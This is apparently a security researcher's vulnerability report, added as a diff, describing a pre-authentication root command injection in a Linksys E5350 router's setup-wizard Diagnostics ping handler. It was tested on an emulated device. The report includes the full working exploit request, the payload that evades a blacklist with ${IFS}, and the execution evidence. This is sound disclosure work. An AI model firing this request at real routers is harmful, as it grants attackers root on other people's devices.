@@ -1,0 +1,64 @@
+================================================================================
+V2: PRE-AUTH (factory/wizard state) OS command injection via /wizard/apply.cgi
+Target: Linksys E5350 FW 1.0.00.037 (rehosted, e5350-replay @ 172.33.35.2)
+Date: 2026-10-11
+================================================================================
+
+[Precondition]
+Router in factory/setup-wizard state: nvram wizard_finish != "1"
+(equivalent to out-of-box, or after factory reset, before owner completes setup).
+Emulated via nvram faker defaults; /tmp/nvram_fake.log confirms:
+ GET+ wizard_finish=0
+ GET- wizard_status=(miss)
+
+[Key static fact]
+mime_handlers table @ 0x4966c0, entry 18:
+ pat=*wizard/apply.cgi* POST=0x430bc4 GET=0x43b8cc
+i.e. wizard/apply.cgi shares the SAME dispatcher as apply.cgi (incl. the
+gozila_cgi submit table with Diagnostics start_ping / start_traceroute).
+In wizard state the URL whitelist (index.asp, SysInfo.htm, close_wizard.cgi,
+session.cgi, sign.cgi, wizard/*, statics) is served WITHOUT any session check;
+non-whitelisted URLs (e.g. /apply.cgi) get 302 to index.asp.
+
+[Request — NO session_id, NO credentials]
+POST /wizard/apply.cgi HTTP/1.1
+Host: 172.33.35.2
+Content-Type: application/x-www-form-urlencoded
+
+submit_button=Diagnostics&submit_type=start_ping&change_action=gozila_cgi&
+gui_action=Apply&commit=1&ping_times=5&ping_size=64&
+ping_ip=y%3Bcd%24%7BIFS%7D..%3Bcd%24%7BIFS%7Dtmp%3Btouch%24%7BIFS%7De5350_pwned2%3By
+
+payload decoded: y;cd${IFS}..;cd${IFS}tmp;touch${IFS}e5350_pwned2;y
+(${IFS} evades the space blacklist in diag_pingbutton; "y" resolves via DNS —
+here simulated with an /etc/hosts entry, in the real world an attacker uses an
+authoritative DNS server hosting an A record for the metachar-laden name;
+uClibc getaddrinfo does not reject such characters.)
+
+[Response]
+HTTP 200, 28748 bytes — Diagnostics page rendered (grep: "Diagnostics" x10,
+"Ping" x8). No authentication challenge.
+
+[Runtime proof of command execution]
+1. nvram faker log shows the raw value stored unsanitized:
+ SET ping_ip=y;cd${IFS}..;cd${IFS}tmp;touch${IFS}e5350_pwned2;y
+2. Marker file created by the injected shell commands:
+ -rw-r--r-- 1 root root 0 /tmp/e5350_pwned2
+ (same execution chain as V1, where strace captured
+ execve("/bin/sh", {"sh","-c","ping -c 5 -s 64 -o /tmp/ping.log y;cd${IFS}..;... &"})
+ by the diag_pingbutton service process)
+
+[Boundary controls]
+- Same POST to /apply.cgi (no wizard/ prefix) in wizard state:
+ HTTP 302 -> http://172.33.35.2/index.asp (blocked, as designed)
+- In non-wizard state (wizard_finish=1) wizard/apply.cgi requires session auth.
+=> The flaw is specifically: Diagnostics dispatch reachable PRE-AUTH whenever
+ the device is in factory/wizard state.
+
+[Impact]
+Unauthenticated LAN-side (or WAN-side if remote management enabled before
+setup) attacker gains arbitrary command execution as root on a device that is
+fresh out of the box or was just factory-reset — before the owner has set any
+password. CWE-78. No user interaction required beyond the device awaiting
+initial setup.
+================================================================================
